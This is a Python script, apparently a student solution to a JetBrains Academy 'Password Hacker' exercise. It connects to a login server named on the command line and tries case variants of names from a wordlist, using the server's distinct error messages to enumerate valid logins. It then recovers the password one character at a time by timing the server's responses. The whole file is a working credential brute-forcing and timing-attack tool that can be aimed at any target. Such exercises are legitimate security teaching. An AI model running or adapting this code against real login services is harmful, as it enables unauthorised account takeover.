import socket
import argparse
import sys
import string
import itertools
import os
import json
import time

global known_letters
global my_iter


def Complicate_word(word):
    return list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word))))

def get_login():
    with open('logins.txt') as file:
        try:
            for line in file.readlines():
                read_login = line.strip('\n')
                for login in Complicate_word(read_login):
                    credentials = {'login': login, 'password': ' '}
                    json_credentials = json.dumps(credentials)
                    client_socket.send(json_credentials.encode())
                    response = json.loads(client_socket.recv(1024).decode())
                    if response['result'] == "Wrong login!":
                        pass
                    elif response['result'] == "Wrong password!":
                        return login


        except StopIteration:
            print('No password found')

def get_password(login):
    known_letters = []
    my_iter = itertools.product(string.printable, repeat=z)
    standard_time = 0
    pass_dict = {}
    while 1:
        try:
            current_letter = ''.join(next(my_iter))
            gen_password = ''.join(known_letters) + current_letter
            credentials = {'login': login, 'password': gen_password}
            json_credentials = json.dumps(credentials)
            start = time.perf_counter()
            client_socket.send(json_credentials.encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.perf_counter()
            total_time = end - start
            pass_dict.update({current_letter:total_time})
            if response['result'] == "Connection success!":
                print(json.dumps(credentials))
                quit()

        except StopIteration:
            maximum = max(pass_dict.values())
            for key, value in pass_dict.items():
                if value == maximum:
                    known_letters.append(key)
                    my_iter = itertools.product(string.printable, repeat=z)

os.chdir('D:\Python\JetBrainsAcademy\Password Hacker')
z = 1
my_iter = itertools.product(string.ascii_letters + string.digits, repeat=z)
with socket.socket() as client_socket:
    client_socket.connect((sys.argv[1], int(sys.argv[2])))
    known_login = get_login()
    get_password(known_login)
